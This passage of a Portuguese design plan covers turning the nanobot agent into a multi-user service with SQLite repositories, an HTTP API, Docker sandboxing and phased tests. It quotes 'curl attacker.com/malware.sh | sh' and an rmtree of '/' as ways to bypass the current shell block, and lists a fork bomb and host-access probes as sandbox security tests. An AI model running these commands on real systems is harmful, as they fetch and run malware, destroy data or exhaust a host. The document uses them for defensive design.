class BaseChannel(ABC):
    def __init__(self, config, bus, binding_repo: ChannelBindingRepository | None = None):
        ...
        self._binding_repo = binding_repo

    async def _resolve_user(self, sender_id: str) -> str | None:
        if self._binding_repo is None:
            return None  # backward compat: sem multi-tenant
        return await self._binding_repo.resolve_user(self.name, str(sender_id))

    async def _handle_message(self, sender_id, chat_id, content, ...):
        user_id = await self._resolve_user(sender_id)
        if user_id is None:
            logger.warning("Unknown sender {} on channel {}", sender_id, self.name)
            return

        msg = InboundMessage(
            channel=self.name,
            sender_id=str(sender_id),
            chat_id=str(chat_id),
            content=content,
            user_id=user_id,  # NOVO
            ...
        )
        await self.bus.publish_inbound(msg)
```

**Esforco**: M (2-3 dias para base + adaptar channels)

### 5.11 CronService (`cron/service.py`)

**Mudanca**: Reescrita para usar `CronRepository`. Cada job tem `user_id`.

```python
class CronService:
    def __init__(self, repo: CronRepository, on_job=None):
        self.repo = repo
        self.on_job = on_job

    async def get_due_jobs(self) -> list[dict]:
        # Busca cross-user: todos os jobs cujo next_run_at_ms <= agora
        return await self.repo.get_due_jobs()

    async def add_job(self, user_id: str, name, schedule, message, ...) -> dict:
        # Verifica limites do user antes de criar
        ...
```

**Esforco**: M (2-3 dias)

### 5.12 HeartbeatService (`heartbeat/service.py`)

**Mudanca**: Converter para cron jobs por user. O conteudo de `bootstrap.heartbeat` de cada user vira um cron job. HeartbeatService pode ser eliminado.

**Esforco**: S (1 dia)

### 5.13 SubagentManager (`agent/subagent.py`)

**Mudanca**: Recebe `user_id`. Subagent herda UserContext do parent (mesmas tools, sandbox, memoria).

**Esforco**: M (1-2 dias)

### 5.14 Config Split

**Nivel 1 — ServerConfig** (arquivo/env vars, global):
- Database path (SQLite) ou URI (MongoDB futuro)
- LLM provider API keys
- Channel tokens (bot tokens)
- Gateway config (porta, host)
- Sandbox config (imagem, network mode)
- Max concurrent requests

**Nivel 2 — UserConfig** (banco, collection users, por user):
- Model e parametros LLM
- Tools habilitados
- Bootstrap files
- Limites e quotas

```python
# nanobot/config/server_config.py
class ServerConfig(BaseSettings):
    db_path: str = "~/.nanobot/nanobot.db"
    # db_mongo_uri: str = ""  # futuro
    max_concurrent: int = 20
    jwt_secret: str = ""
    # ... providers, channels, gateway (mesmo schema atual)
```

**Esforco**: M (1-2 dias)

### 5.15 Novos Modulos

| Modulo | Descricao |
|---|---|
| `nanobot/db/repositories.py` | Protocols (interfaces) |
| `nanobot/db/sqlite/connection.py` | Pool aiosqlite |
| `nanobot/db/sqlite/migrations.py` | Schema DDL |
| `nanobot/db/sqlite/*_repo.py` | 7 implementacoes de repository |
| `nanobot/api/server.py` | FastAPI setup |
| `nanobot/api/auth.py` | JWT + API key |
| `nanobot/api/routes/*.py` | Endpoints (chat, sessions, memory, skills, cron, admin) |
| `nanobot/api/deps.py` | Dependency injection FastAPI |
| `nanobot/config/server_config.py` | ServerConfig (split) |
| `nanobot/sandbox/manager.py` | SandboxManager (fase 3) |
| `nanobot/sandbox/Dockerfile` | Imagem sandbox (fase 3) |

### 5.16 Resumo: Mapa de Impacto

| Arquivo | Mudanca | Esforco |
|---|---|---|
| `bus/events.py` | Adicionar `user_id` | S |
| `bus/queue.py` | Sem mudanca (fila unica, dispatch paralelo no AgentLoop) | - |
| `session/manager.py` | Reescrita -> Repository | M |
| `agent/memory.py` | Reescrita -> Repository | M |
| `agent/skills.py` | Reescrita parcial -> Repository + builtins | M |
| `agent/context.py` | Async, user_doc, bootstrap do banco | M |
| **`agent/loop.py`** | **UserContext, paralelo, repos** | **L** |
| `agent/subagent.py` | user_id, herdar UserContext | M |
| `agent/tools/shell.py` | Restrict workspace (fase 1), sandbox (fase 3) | S / L |
| `agent/tools/filesystem.py` | Restrict workspace (fase 1), sandbox (fase 3) | S / L |
| `agent/tools/base.py` | Sem mudanca | - |
| `agent/tools/registry.py` | Sem mudanca (1 instancia por user) | - |
| `agent/tools/web.py` | Sem mudanca (stateless) | - |
| `agent/tools/message.py` | Minima (user_id no context) | S |
| `agent/tools/spawn.py` | Passar user_id | S |
| `agent/tools/cron.py` | Passar user_id | S |
| `channels/base.py` | resolve_user(), user_id | M |
| `channels/manager.py` | Receber repos | S |
| `channels/*.py` (11) | Propagar user_id | M |
| `config/schema.py` | Split server/user | M |
| `config/loader.py` | Banco + server config | M |
| `cron/service.py` | Reescrita -> Repository | M |
| `heartbeat/service.py` | Converter para cron ou remover | S |
| `cli/commands.py` | Rewiring completo | L |
| `utils/helpers.py` | Manter helpers uteis | S |
| **NOVOS: `db/`** | **Repository + SQLite** | **L** |
| **NOVOS: `api/`** | **HTTP API** | **L** |
| **NOVOS: `sandbox/`** | **Container lifecycle (fase 3)** | **L** |

---

## 6. API HTTP

### 6.1 Configuracao

```
Base URL: http://host:18790/api/v1
Auth: Header "Authorization: Bearer <jwt_or_api_key>"
Content-Type: application/json
```

### 6.2 Endpoints

#### Auth

| Metodo | Endpoint | Descricao |
|---|---|---|
| POST | `/auth/token` | Gera JWT a partir de API key |

#### Chat

| Metodo | Endpoint | Descricao |
|---|---|---|
| POST | `/chat` | Envia mensagem, recebe resposta completa |
| POST | `/chat/stream` | Envia mensagem, resposta via SSE |

Request:
```json
{"message": "Hello!", "session_id": "ses_abc123"}
```

Response:
```json
{
  "response": "Hi! How can I help?",
  "session_id": "ses_abc123",
  "tools_used": ["web_search"],
  "tokens_used": {"prompt": 1200, "completion": 350}
}
```

#### Sessions

| Metodo | Endpoint | Descricao |
|---|---|---|
| GET | `/sessions` | Lista sessoes do user |
| GET | `/sessions/{id}` | Historico de mensagens |
| DELETE | `/sessions/{id}` | Arquiva sessao |
| POST | `/sessions/{id}/new` | Consolida memoria + nova sessao |

#### Memory

| Metodo | Endpoint | Descricao |
|---|---|---|
| GET | `/memory` | Long-term + ultimas N history |
| PUT | `/memory/long-term` | Atualiza long-term |
| GET | `/memory/search?q=python` | Full-text search |

#### Skills

| Metodo | Endpoint | Descricao |
|---|---|---|
| GET | `/skills` | Lista skills user + builtins |
| POST | `/skills` | Cria skill |
| PUT | `/skills/{name}` | Atualiza skill |
| DELETE | `/skills/{name}` | Remove skill |

#### Cron

| Metodo | Endpoint | Descricao |
|---|---|---|
| GET | `/cron` | Lista jobs |
| POST | `/cron` | Cria job |
| DELETE | `/cron/{job_id}` | Remove job |

#### Admin

| Metodo | Endpoint | Descricao |
|---|---|---|
| POST | `/admin/users` | Cria user |
| GET | `/admin/users` | Lista users |
| PUT | `/admin/users/{id}` | Atualiza user |
| DELETE | `/admin/users/{id}` | Desabilita user |
| GET | `/admin/audit` | Consulta audit log |

### 6.3 Dependencias da API

| Pacote | Motivo |
|---|---|
| `fastapi>=0.100` | HTTP framework |
| `uvicorn>=0.20` | ASGI server |
| `python-jose[cryptography]>=3.3` | JWT |

---

## 7. Isolamento de Execucao (Sandbox)

> **Nota**: Sandbox e Fase 3. Nas fases 1-2, o ExecTool roda no host com `restrict_to_workspace=True` e workspaces isolados por user em `/sandboxes/{user_id}/`.

### 7.1 Por Que e Necessario

O ExecTool atual e contornavel:

```
Bloqueado:      rm -rf /
NAO bloqueado:  python -c "import shutil; shutil.rmtree('/')"
NAO bloqueado:  curl attacker.com/malware.sh | sh
```

### 7.2 Modelo: Container Docker por User

```
+--------------------------------------------------+
|  Host (nanobot server)                            |
|                                                   |
|  AgentLoop --> SandboxManager --> Docker API       |
|                                                   |
|    +----------+ +----------+ +----------+         |
|    |Container | |Container | |Container |         |
|    |user_A    | |user_B    | |user_C    |         |
|    |/workspace| |/workspace| |/workspace|         |
|    |CPU: 0.5  | |CPU: 0.5  | |CPU: 0.5  |         |
|    |MEM: 256M | |MEM: 256M | |MEM: 256M |         |
|    +----------+ +----------+ +----------+         |
|                                                   |
|  /sandboxes/                                      |
|  +-- usr_A/workspace/ (bind mount)                |
|  +-- usr_B/workspace/                             |
|  +-- usr_C/workspace/                             |
+--------------------------------------------------+
```

### 7.3 Lifecycle

1. **Lazy creation** — container so e criado quando user usa exec/filesystem
2. **Reuso** — container fica vivo para uso subsequente
3. **Cleanup** — inativo >30min -> parar e remover (workspace preservado)

### 7.4 Restricoes de Seguranca

| Restricao | Config Docker |
|---|---|
| Rede controlada | Bridge dedicada, ICC=false, host bloqueado |
| Sem privilegios | `cap_drop: ALL` |
| Non-root | `user: 1000:1000` |
| No new privileges | `security_opt: no-new-privileges` |
| CPU limitada | `cpus: 0.5` |
| MEM limitada | `mem_limit: 256m` |
| Timeout | Aplicado no host (30s default) |
| Filesystem isolado | Bind mount so do workspace do user |

### 7.5 Dependencias do Sandbox

| Pacote | Motivo |
|---|---|
| `docker>=7.0` | Docker SDK (so fase 3) |

---

## 8. Seguranca

### 8.1 Autenticacao

- **JWT** (recomendado para API): API key -> `POST /auth/token` -> JWT com `sub=user_id`, valido 1h
- **API Key direta**: Prefixo `nk_`, armazenada como hash SHA-256

### 8.2 Autorizacao

- `user_id` em TODA query ao banco
- Endpoints admin requerem `role='admin'`
- Sem mecanismo para acessar dados de outro user

### 8.3 Rate Limiting

Configuravel por user em `users.limits`:
- `max_requests_per_minute`: 30
- `max_tokens_per_day`: 1.000.000

Contadores em `users.tokens_today` / `requests_today`. Reset diario.

### 8.4 Audit Trail

Eventos: login, tool_exec, config_change, session_create, memory_update, skill_crud, cron_crud, sandbox_lifecycle.

Cleanup automatico >90 dias.

---

## 9. Plano de Fases com Testes

### Fase 1: Foundation — Multi-User com SQLite (3-4 semanas)

**Objetivo**: SQLite como backend, `user_id` em toda a stack, isolamento de dados.

**Progresso**: 5 de 7 sub-fases concluídas (1.1, 1.2, 1.3, 1.4, 1.5). 236 testes passando.

#### 1.1 Database Layer + Repository Pattern (3-4 dias) ✅ CONCLUÍDO

**Tarefas**:
- Criar `nanobot/db/repositories.py` com todos os Protocols
- Criar `nanobot/db/sqlite/connection.py` (pool aiosqlite)
- Criar `nanobot/db/sqlite/migrations.py` (DDL de todas as tabelas)
- Implementar `SQLiteUserRepository`

**Como testar**:
```bash
# Teste unitario: migrations criam schema correto
pytest tests/db/test_migrations.py -v

# Teste: CRUD de users funciona
pytest tests/db/test_user_repo.py -v

# Teste manual: banco criado em /tmp/test_nanobot.db
python -c "
import asyncio, aiosqlite
from nanobot.db.sqlite.migrations import apply_migrations
from nanobot.db.sqlite.user_repo import SQLiteUserRepository

async def main():
    db = await aiosqlite.connect('/tmp/test_nanobot.db')
    await apply_migrations(db)
    repo = SQLiteUserRepository(db)
    uid = await repo.create({
        'user_id': 'usr_test1',
        'display_name': 'Test User',
        'email': 'test@test.com',
    })
    user = await repo.get_by_id('usr_test1')
    print(f'Created user: {user}')
    await db.close()

asyncio.run(main())
"
```

> **Implementado**: Protocols em `nanobot/db/repositories.py` (8 interfaces), `SQLiteUserRepository`,
> migrations com 7 tabelas (users, sessions, messages, memories, skills, cron_jobs, channel_bindings),
> `RepositoryFactory` dataclass, `create_sqlite_factory()`. 28 testes em `tests/db/`.

#### 1.2 Session + Memory + Skills Repositories (4-5 dias) ✅ CONCLUÍDO

**Tarefas**:
- Implementar `SQLiteSessionRepository` + `SQLiteMessageRepository`
- Implementar `SQLiteMemoryRepository` (com FTS5)
- Implementar `SQLiteSkillRepository`
- Implementar `SQLiteCronRepository`

**Como testar**:
```bash
# Testes unitarios para cada repository
pytest tests/db/test_session_repo.py -v
pytest tests/db/test_memory_repo.py -v
pytest tests/db/test_skill_repo.py -v
pytest tests/db/test_cron_repo.py -v

# Teste de isolamento: user A nao ve dados de user B
pytest tests/db/test_isolation.py -v
# Este teste cria 2 users, salva sessoes/memorias/skills para cada,
# e verifica que queries de user_A so retornam dados de user_A
```

> **Implementado**: `SQLiteSessionRepository`, `SQLiteMessageRepository`, `SQLiteMemoryRepository`,
> `SQLiteSkillRepository`, `SQLiteCronRepository`. Testes de isolamento entre users. 36 testes em `tests/db/`.

#### 1.3 Adaptar SessionManager + MemoryStore + SkillsLoader (4-5 dias) ✅ CONCLUÍDO

**Tarefas**:
- Reescrever `SessionManager` para usar `SessionRepository`
- Reescrever `MemoryStore` para usar `MemoryRepository`
- Reescrever `SkillsLoader` para usar `SkillRepository` + builtins
- Tornar metodos async onde necessario

**Como testar**:
```bash
# Testes unitarios com mock repos
pytest tests/agent/test_session_manager.py -v
pytest tests/agent/test_memory_store.py -v
pytest tests/agent/test_skills_loader.py -v

# Teste de integracao: SessionManager + SQLite real
pytest tests/integration/test_session_sqlite.py -v

# Teste manual: salvar e recuperar sessao
python -c "
import asyncio
from nanobot.db.sqlite.connection import create_connection
from nanobot.db.sqlite.session_repo import SQLiteSessionRepository
from nanobot.session.manager import SessionManager

async def main():
    db = await create_connection('/tmp/test.db')
    repo = SQLiteSessionRepository(db)
    mgr = SessionManager(repo, user_id='usr_test1')
    session = await mgr.get_or_create('telegram:12345')
    session.add_message('user', 'Hello!')
    await mgr.save(session)
    # Recarregar
    session2 = await mgr.get_or_create('telegram:12345')
    print(f'Messages: {len(session2.messages)}')  # Deve ser 1
    await db.close()

asyncio.run(main())
"
```

> **Implementado**: Dual-mode (filesystem backward compat + DB mode) para SessionManager, MemoryStore,
> SkillsLoader. Todos os métodos públicos agora async. ContextBuilder.build_system_prompt() e
> build_messages() agora async. AgentLoop atualizado com await. Correção de bug `cursor.lastrowid`
> no UPSERT do session_repo. 34 testes novos em `tests/agent/` (11 session + 9 memory + 14 skills).
> Total: 145 testes passando.

#### 1.4 Adaptar ContextBuilder + InboundMessage (2-3 dias) ✅ CONCLUÍDO

**Tarefas**:
- Adicionar `user_id` ao `InboundMessage`
- Adaptar `ContextBuilder` para async + user_doc bootstrap
- Criar `ServerConfig` (split do config.json)

**Como testar**:
```bash
# Teste unitario: ContextBuilder monta prompt com bootstrap do user_doc
pytest tests/agent/test_context_builder.py -v

# Teste: InboundMessage carrega user_id
python -c "
from nanobot.bus.events import InboundMessage
msg = InboundMessage(channel='api', sender_id='x', chat_id='y', content='hi', user_id='usr_1')
print(f'user_id={msg.user_id}')  # usr_1
"
```

> **Implementado**: `InboundMessage.user_id` (campo opcional, backward compat). ContextBuilder dual-mode
> (fs + db): bootstrap files do user's DB record com fallback para filesystem. `ServerConfig` dataclass
> que separa config server-level (providers, gateway, channels, tools) de per-user (agent_config, limits,
> tools_enabled, bootstrap). Identity section adaptada para DB mode (sem referências a MEMORY.md/HISTORY.md).
> 33 testes novos (20 context_builder + 8 events + 5 server_config). Total: 207 testes passando.

#### 1.5 Adaptar AgentLoop + UserContext (4-5 dias) ✅ CONCLUÍDO

**Tarefas**:
- Criar dataclass `UserContext`
- AgentLoop com cache de UserContext + processamento paralelo
- Resolucao de user_id para cada mensagem
- ToolRegistry por user (baseado em `tools_enabled`)
- Rate limiting basico + usage tracking

**Como testar**:
```bash
# Teste unitario com mock repos e mock provider
pytest tests/agent/test_agent_loop_multiuser.py -v

# Teste de concorrencia: 3 users simultaneos
pytest tests/integration/test_concurrent_users.py -v
# Esse teste envia 3 mensagens de users diferentes em paralelo
# e verifica que cada um recebe resposta isolada

# Teste de rate limiting:
pytest tests/agent/test_rate_limiting.py -v
# Envia mais requests que o limite e verifica que sao rejeitados
```

> **Implementado**: `UserContext` dataclass com sessions, context, memory, skills, tools, model, limits
> per-user. `build_user_context()` factory async que carrega user do DB e cria componentes em DB mode.
> `build_tool_registry()` filtra tools por `tools_enabled` do user. `RateLimiter` com sliding window
> in-memory (60s RPM) + daily token limit via DB. AgentLoop reescrito: resolve user via
> `ChannelBindingRepository`, cache de `UserContext`, per-user tools/model/settings, rate limiting
> integrado. Backward compat total: sem repos = FS mode (single user). 29 testes novos
> (17 user_context + 12 agent_loop_multiuser). Total: 236 testes passando.

#### 1.6 Adaptar CronService + Gateway Wiring (2-3 dias) ✅ CONCLUIDO

**Tarefas realizadas**:
- [x] CronService dual-mode: usar `CronRepository` (DB) ou filesystem (compat)
- [x] CronJob.user_id: campo adicionado para scoping per-user
- [x] CronService: todos metodos publicos agora async (list_jobs, add_job, remove_job, enable_job, run_job)
- [x] CronService: todos metodos aceitam `user_id` para isolamento
- [x] CronTool: metodos `_add_job`, `_list_jobs`, `_remove_job` agora async
- [x] CronTool: `set_context()` recebe `user_id`, passa ao CronService
- [x] AgentLoop._set_tool_context(): propaga `user_id` do UserContext ao CronTool
- [x] CLI cron commands: `asyncio.run()` para chamar CronService async
- [x] CronService.status(): retorna `jobs: -1` em DB mode (sync-safe)
- [x] HeartbeatService test: reescrito para nova API (HEARTBEAT_OK_TOKEN removido)
- [x] 11 testes novos para CronService DB mode (isolamento, enable/disable, oneshot, tz validation)

- [x] Gateway wiring: `--multiuser` flag inicializa SQLite, cria RepositoryFactory, passa `repos` ao AgentLoop
- [x] CLI user commands: `nanobot user create/bind/unbind/list`
- [x] Teste E2E: 8 testes (session isolation, cron isolation, access denied, rate limit, memory isolation, multi-channel)

**O que NAO foi feito** (adiado para Fase 2):
- HeartbeatService per-user — depende de ter users no DB com heartbeat config

**Como testar**:
```bash
# Testes automatizados
pytest tests/db/test_cron_service_db.py tests/db/test_multiuser_e2e.py -v

# Teste manual: criar users e subir gateway
nanobot user create alice --name "Alice" --email alice@test.com
nanobot user create bob --name "Bob"
nanobot user bind alice --channel telegram --sender-id 12345
nanobot user bind bob --channel whatsapp --sender-id 5511999999
nanobot user list
nanobot gateway --multiuser
```

**Total**: 257 testes passando.

#### 1.7 Migracao de dados existentes (1-2 dias) ⏳ PROXIMO

**Tarefas**:
- [ ] Script `nanobot migrate` que le filesystem existente e importa para SQLite
- [ ] Cria user default com dados do workspace atual
- [ ] Migra: sessions/*.jsonl -> sessions + messages tables
- [ ] Migra: MEMORY.md + HISTORY.md -> memories table
- [ ] Migra: skills/ -> skills table
- [ ] Migra: cron.json -> cron_jobs table
- [ ] Migra: bootstrap files (SOUL.md, AGENTS.md, etc.) -> users.bootstrap
- [ ] `--dry-run` flag mostra o que seria migrado sem executar

**Como testar**:
```bash
# Teste: migrar workspace existente
nanobot migrate --dry-run   # mostra o que seria migrado
nanobot migrate             # executa

# Verificar:
sqlite3 ~/.nanobot/nanobot.db "SELECT * FROM users;"
sqlite3 ~/.nanobot/nanobot.db "SELECT COUNT(*) FROM sessions;"
sqlite3 ~/.nanobot/nanobot.db "SELECT COUNT(*) FROM memories;"
```

**Dependencias**: 1.6 (gateway funcional com SQLite)

**Entregavel da Fase 1**: nanobot funcional com SQLite, N users, isolamento de dados, sem sandbox. ExecTool roda no host com `restrict_to_workspace=True`. Docker Desktop (Debian + XFCE + noVNC) disponivel para testes via browser (`docker-compose.desktop.yml`).

---

### Fase 2: API HTTP (2-3 semanas) ⬚ PENDENTE

**Objetivo**: API REST para integracao com agent builder.
**Depende de**: Fase 1 completa.

#### 2.1 Setup FastAPI + Auth (3-4 dias)

**Tarefas**:
- Criar `nanobot/api/server.py` (FastAPI app)
- Criar `nanobot/api/auth.py` (JWT + API key middleware)
- Criar `nanobot/api/deps.py` (dependency injection)
- Integrar no gateway (FastAPI roda junto com AgentLoop)

**Como testar**:
```bash
# Teste de auth
pytest tests/api/test_auth.py -v

# Teste manual: subir API
nanobot gateway --port 18790

# Em outro terminal:
# Gerar token
curl -X POST http://localhost:18790/api/v1/auth/token \
  -H "Content-Type: application/json" \
  -d '{"api_key": "nk_test123"}'

# Testar acesso sem token (deve dar 401)
curl http://localhost:18790/api/v1/sessions

# Testar com token
curl http://localhost:18790/api/v1/sessions \
  -H "Authorization: Bearer <token_obtido>"
```

#### 2.2 Endpoints de Chat (3-4 dias)

**Tarefas**:
- `POST /chat` (sincrono)
- `POST /chat/stream` (SSE)

**Como testar**:
```bash
pytest tests/api/test_chat.py -v

# Teste manual:
curl -X POST http://localhost:18790/api/v1/chat \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"message": "What is 2+2?"}'

# Teste SSE:
curl -N -X POST http://localhost:18790/api/v1/chat/stream \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"message": "Tell me a story"}'
```

#### 2.3 Endpoints CRUD (3-4 dias)

**Tarefas**:
- Sessions CRUD
- Memory CRUD + search
- Skills CRUD
- Cron CRUD

**Como testar**:
```bash
pytest tests/api/test_sessions.py -v
pytest tests/api/test_memory.py -v
pytest tests/api/test_skills.py -v
pytest tests/api/test_cron.py -v

# Teste manual: criar skill via API
curl -X POST http://localhost:18790/api/v1/skills \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name": "my_skill", "content": "---\ndescription: Test skill\n---\nDo something", "description": "Test"}'

# Listar skills
curl http://localhost:18790/api/v1/skills \
  -H "Authorization: Bearer <token>"
```

#### 2.4 Endpoints Admin + Rate Limiting (2-3 dias)

**Tarefas**:
- CRUD de users (admin only)
- Rate limiting middleware
- Audit log endpoint

**Como testar**:
```bash
pytest tests/api/test_admin.py -v
pytest tests/api/test_rate_limiting.py -v

# Teste: criar user via admin
curl -X POST http://localhost:18790/api/v1/admin/users \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"display_name": "New User", "email": "new@test.com"}'

# Teste rate limit: enviar muitas requests rapidas
for i in $(seq 1 35); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:18790/api/v1/chat \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"message": "test"}'
done
# Ultimas devem retornar 429
```

**Entregavel da Fase 2**: API HTTP funcional, agent builder pode enviar mensagens e gerenciar resources.

---

### Fase 3: Sandbox Docker (3-4 semanas) ⬚ PENDENTE

**Objetivo**: Isolamento real de execucao via Docker.
**Depende de**: Fase 2 completa.

#### 3.1 Imagem Docker + SandboxManager (5-6 dias)

**Tarefas**:
- Criar `nanobot/sandbox/Dockerfile`
- Criar `nanobot/sandbox/manager.py` (create, destroy, cleanup)
- Criar rede Docker isolada

**Como testar**:
```bash
# Build da imagem
docker build -t nanobot-sandbox:latest -f nanobot/sandbox/Dockerfile .

# Teste unitario do manager
pytest tests/sandbox/test_manager.py -v

# Teste manual: criar container
python -c "
import asyncio
from nanobot.sandbox.manager import SandboxManager

async def main():
    mgr = SandboxManager()
    container = await mgr.get_or_create('usr_test1', limits={'cpu': '0.5', 'memory': '256m'})
    result = await container.exec('echo hello world')
    print(f'Output: {result}')
    await mgr.destroy('usr_test1')

asyncio.run(main())
"
```

#### 3.2 SandboxedExecTool + FilesystemTools (3-4 dias)

**Tarefas**:
- `SandboxedExecTool` que executa no container via Docker API
- Adaptar filesystem tools para operar no container
- Integrar no ToolRegistry

**Como testar**:
```bash
pytest tests/sandbox/test_exec_tool.py -v
pytest tests/sandbox/test_filesystem_tools.py -v

# Teste de isolamento
pytest tests/sandbox/test_isolation.py -v
# User A executa 'touch /workspace/secret.txt'
# User B tenta 'cat /workspace/secret.txt' -> nao encontra
```

#### 3.3 Testes de Seguranca (3-4 dias)

**Como testar**:
```bash
# Container escape
pytest tests/sandbox/test_security.py -v

# Testes especificos:
# - Acesso ao host: curl 172.17.0.1 (deve falhar)
# - Acesso ao MongoDB: curl host:27017 (deve falhar)
# - Inter-container: ping container_B (deve falhar)
# - Resource limits: python -c "a='x'*1000000000" (OOM kill)
# - Fork bomb: :(){ :|:& };: (pids-limit)
# - Path traversal: cat /etc/passwd do host (impossivel, esta no container)

# Teste de carga
pytest tests/sandbox/test_load.py -v
# Cria 10 containers, executa comandos em paralelo,
# verifica que todos respondem e resources sao respeitados
```

**Entregavel da Fase 3**: Exec/filesystem isolado por user em containers Docker.

---

### Fase 4: Channels Multi-Tenant + Polish (2-3 semanas) ⬚ PENDENTE

#### 4.1 Channel Bindings (2-3 dias)

**Tarefas**:
- Implementar `SQLiteChannelBindingRepository`
- Adaptar `BaseChannel.resolve_user()`
- Adaptar channels individuais

**Como testar**:
```bash
pytest tests/channels/test_bindings.py -v

# Teste manual: vincular Telegram user a user interno
sqlite3 ~/.nanobot/nanobot.db "
INSERT INTO channel_bindings (user_id, channel, sender_id)
VALUES ('usr_test1', 'telegram', '123456789');
"
# Enviar mensagem pelo Telegram -> deve resolver para usr_test1
```

#### 4.2 CLI Admin + Onboarding (2-3 dias)

**Tarefas**:
- `nanobot admin create-user --name "Carlos" --email "carlos@test.com"`
- `nanobot admin list-users`
- `nanobot admin bind-channel --user usr_abc --channel telegram --sender 123456`

**Como testar**:
```bash
nanobot admin create-user --name "Carlos" --email "carlos@test.com"
# Output: Created user usr_abc123 with API key nk_...

nanobot admin list-users
# Output: tabela com users

nanobot admin bind-channel --user usr_abc123 --channel telegram --sender 123456789
```

#### 4.3 Testes End-to-End (3-4 dias)

**Como testar**:
```bash
# E2E completo: criar user, enviar msg via API, verificar sessao, memoria, etc.
pytest tests/e2e/test_full_flow.py -v

# E2E com channels: simular mensagem Telegram
pytest tests/e2e/test_telegram_flow.py -v

# E2E com cron: criar job, esperar execucao, verificar resultado
pytest tests/e2e/test_cron_flow.py -v

# Teste de 2 users simultaneos via API
pytest tests/e2e/test_two_users.py -v
```

### Resumo do Timeline

| Fase | Duracao | Acumulado | Status |
|---|---|---|---|
| Fase 1: Foundation (SQLite + multi-user) | 3-4 semanas | 3-4 sem | 🟡 5/7 concluidas |
| Fase 2: API HTTP | 2-3 semanas | 5-7 sem | ⬚ Pendente |
| Fase 3: Sandbox Docker | 3-4 semanas | 8-11 sem | ⬚ Pendente |
| Fase 4: Channels + Polish | 2-3 semanas | 10-14 sem | ⬚ Pendente |

**Total estimado: 10-14 semanas** (1 dev full-time).

**Infraestrutura de teste**: Docker Desktop (Debian + XFCE + noVNC) disponivel via `docker-compose.desktop.yml`.
Acesso pelo browser em `http://localhost:6080/vnc.html` (senha: `nanobot`).

---

## 10. Riscos e Decisoes

### 10.1 Riscos Tecnicos

| Risco | Prob. | Impacto | Mitigacao |
|---|---|---|---|
| SQLite write contention com muitos users | Media | Alto | WAL mode + connection pool; migrar para MongoDB se necessario |
| Docker overhead para muitos containers | Media | Medio | Cleanup agressivo + lazy creation |
| LLM rate limits com muitos users | Alta | Alto | Queue + retry com backoff |
| Latencia de criacao de container | Alta | Medio | Pool pre-warm (futuro) |
| Compatibilidade com channels existentes | Media | Medio | Manter BaseChannel ABC |
| Concorrencia no UserContext cache | Baixa | Alto | asyncio.Lock por user_id |

### 10.2 SQLite vs MongoDB — Quando Migrar?

| Criterio | SQLite | MongoDB |
|---|---|---|
| Ate ~100 users, <50 req/s | Suficiente | Excesso |
| 100-1000 users, <500 req/s | Possivel com WAL | Recomendado |
| >1000 users, >500 req/s | Insuficiente | Necessario |
| Deploys distribuidos (multi-server) | Impossivel | Necessario |
| Busca full-text avancada | FTS5 (basico) | Atlas Search |

**Recomendacao**: Comece com SQLite. O Repository Pattern garante que a migracao sera indolor.

### 10.3 Decisoes Tomadas

| Decisao | Escolha | Justificativa |
|---|---|---|
| Banco de dados fase 1 | SQLite (aiosqlite) | Zero config, arquivo local, suficiente para comecar |
| Mensagens: embedded vs separada | Tabela separada `messages` | Facilita queries, sem limite de tamanho |
| Builtins: banco vs filesystem | Filesystem (read-only) | Sao do pacote, nao do user |
| Skills criadas pelo agente | Permitidas (per-user) | Sandbox protege |
| MCP servers | Global (fase 1) | Per-user se necessario depois |
| Rate limiting backend | SQLite counters | Redis se precisar de sliding window |
| Auth | JWT + API key hash | Simples, stateless |

### 10.4 Fora do Escopo (futuro)

- Multi-tenant de LLM providers (cada user com sua API key)
- Marketplace de skills
- Billing/metering
- Multi-region
- RBAC alem de user/admin
- Encryption at rest

---

## Apendice A: Mapeamento Antes -> Depois

| Antes (filesystem) | Depois (SQLite) |
|---|---|
| `~/.nanobot/config.json` | `users` table + ServerConfig file |
| `workspace/sessions/*.jsonl` | `sessions` + `messages` tables |
| `workspace/memory/MEMORY.md` | `memories` (type='long_term') |
| `workspace/memory/HISTORY.md` | `memories` (type='history', N rows) |
| `workspace/skills/*/SKILL.md` | `skills` table (builtins no filesystem) |
| `workspace/cron.json` | `cron_jobs` table |
| `workspace/SOUL.md` | `users.bootstrap.soul` |
| `workspace/AGENTS.md` | `users.bootstrap.agents_instructions` |
| `workspace/USER.md` | `users.bootstrap.user_info` |
| `workspace/TOOLS.md` | `users.bootstrap.tools_instructions` |
| `workspace/IDENTITY.md` | `users.bootstrap.identity` |
| `workspace/HEARTBEAT.md` | `users.bootstrap.heartbeat` -> cron job |
| (nao existia) | `channel_bindings` table |
| (nao existia) | `audit_log` table |

## Apendice B: Dependencias por Fase

| Fase | Pacotes Novos |
|---|---|
| Fase 1 | `aiosqlite>=0.20.0` |
| Fase 2 | `fastapi>=0.100`, `uvicorn>=0.20`, `python-jose[cryptography]>=3.3` |
| Fase 3 | `docker>=7.0` |
| Futuro (MongoDB) | `motor>=3.0`, `pymongo>=4.0` |

## Apendice C: Estrutura Final do Projeto

```
nanobot/
  agent/
    loop.py              # AgentLoop com UserContext + paralelo
    context.py           # ContextBuilder async + user_doc
    memory.py            # MemoryStore via Repository
    skills.py            # SkillsLoader via Repository + builtins
    subagent.py          # SubagentManager com user_id
    tools/
      base.py            # (sem mudanca)
      registry.py        # (sem mudanca, 1 por user)
      shell.py           # ExecTool (fase 1) / SandboxedExecTool (fase 3)
      filesystem.py      # Restrict workspace (fase 1) / Sandbox (fase 3)
      web.py             # (sem mudanca)
      message.py         # user_id no context
      spawn.py           # user_id
      cron.py            # user_id
      mcp.py             # (global fase 1)
  api/                   # NOVO (fase 2)
    server.py
    auth.py
    deps.py
    routes/
      chat.py
      sessions.py
      memory.py
      skills.py
      cron.py
      admin.py
  bus/
    events.py            # +user_id no InboundMessage
    queue.py             # (sem mudanca)
  channels/
    base.py              # +resolve_user()
    manager.py           # +repos
    telegram.py, ...     # +user_id propagation
  cli/
    commands.py          # Rewiring + admin commands
  config/
    schema.py            # Split em ServerConfig/UserConfig
